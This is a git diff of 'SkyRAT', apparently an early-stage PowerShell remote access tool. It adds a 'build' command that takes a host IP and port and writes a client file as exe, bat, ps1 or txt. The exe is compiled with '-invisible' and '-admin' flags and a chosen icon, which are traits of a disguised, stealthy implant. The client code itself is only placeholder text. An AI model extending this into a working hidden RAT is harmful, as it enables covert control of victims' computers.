@@ -7,9 +7,9 @@
 
 ############################################################################################################################################################################################
 
-
-
-
+#  A Powershell Remote Administration Tool
+#  Built by YSCHGroup using the Windows PowerShell Framework.
+#  (Please note that we do not encurage you to do anyting illegal with this tool.)
 
 ############################################################################################################################################################################################
 
@@ -72,7 +72,7 @@ function skyrat-execute($cmd) {                         ########################
     connect                Connect to a client and start sending packages
     settings               Manage all settings              [Under Construction]
     shell                  Open a shell on the local computer
-    version                Display the current version number              [Under Construction]
+    version                Display the current version number
     cls                    Clear screen              [Under Construction]
     menu                   Display the menu again              [Under Construction]
     exit                   Exit out from SkyRAT              [Under Construction]
@@ -92,19 +92,57 @@ function skyrat-execute($cmd) {                         ########################
     }elseif ($SkyRAT_input.ToLower() -eq "shell") {                                 # Shell
         skyrat-shell
 
-    }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # Build
-        # Generate an executeable file
+    }elseif ($SkyRAT_input.ToLower() -eq "build") {                                 # Build
+        Write-Host "Searching for IPaddresses..." -f DarkGray;
+        (Get-NetIPConfiguration).IPv4Address
+        Test-Connection $env:computername -count 1 | select Address,Ipv4Address | Out-String
+        $HostIP = Read-Host "Host IP"
+        $TcpPort = Read-Host "Port"
 
+        Add-Type -AssemblyName System.Windows.Forms
+            $dlg=New-Object System.Windows.Forms.SaveFileDialog
+            $dlg.Filter = "EXE File (*.exe)|*.exe|BAT File (*.bat)|*.bat|PS1 File (*.ps1)|*.ps1|Text File (*.txt)|*.txt|All Files (*.*)|*.*"
+            $dlg.SupportMultiDottedExtensions = $true;
 
+        if($dlg.ShowDialog() -eq 'Ok'){
+            # Generate file
+            if ($dlg.FileName.EndsWith("exe")) {
+                Write-Host "----- EXE" -f yellow;
+                $iconPath = Read-Host "Icon file path"
+                GenerateClient-PS1("$pwd\temp.ps1", $HostIP, $TcpPort);
+                & '.\data\ps1_exe.exe' -ps1 "temp.ps1" -save $dlg.filename -icon $iconPath -invisible -overwrite -admin     # Call the ps1 to exe program
 
+            }elseif ($dlg.FileName.EndsWith("bat")) {
+                Write-Host "----- BAT" -f yellow;
+                "
+                [Client Code for bat here]
+                " | Out-File $dlg.filename
 
+            }elseif ($dlg.FileName.EndsWith("ps1")) {
+                Write-Host "----- PS1" -f yellow;
+                GenerateClient-PS1($dlg.filename, $HostIP, $TcpPort);
 
-    }elseif ($SkyRAT_input.ToLower() -eq "clients") {                                      # clients
+            }elseif ($dlg.FileName.EndsWith("txt")) {
+                Write-Host "----- TXT" -f yellow;
+                "
+                [Client Code for txt here]
+                " | Out-File $dlg.filename
+
+            }else {
+                Write-Host "----- OUTPUT" -f yellow;
+                "
+                [Client Code for other here]
+                " | Out-File $dlg.filename
+            }
+            Write-host "[!] Generating $($dlg.filename)..." -f Green;
+        }else {
+            Write-Host "[!] Save interrupted, interrupts client generation..." -f Red;
+        }
+    }elseif ($SkyRAT_input.ToLower() -eq "clients") {                               # clients
         display-clients
 
-    }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # New Command
-        # Execute all code inside here
-
+    }elseif ($SkyRAT_input.ToLower() -eq "version") {                               # version
+        Write-Host "Current SkyRAT Version: $SkyratVersion" -f DarkYellow
     }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # New Command
         # Execute all code inside here
 
@@ -173,9 +211,15 @@ function noteREM($remLine) {
 }
                                                            ##########################################################################################################
 
+# Client Generation
+function GenerateClient-PS1($filePath, $hostIP, $port) {
+    "
+    [Client Code for ps1 here]
+    " | Out-File $filePath
+}
 
 
-
+# SkyRAT
 function skyrat-input {
     Write-Host "SkyRAT " -f Cyan -NoNewline;Write-Host "$PWD> " -NoNewline;
     $SkyRAT_input = Read-Host;
@@ -208,6 +252,7 @@ function skyrat-shell {
 # Console settings
 [Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8
 $PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
+$SkyratVersion = "v1.0.0 (Alpha)"
 
 
 # Main loop
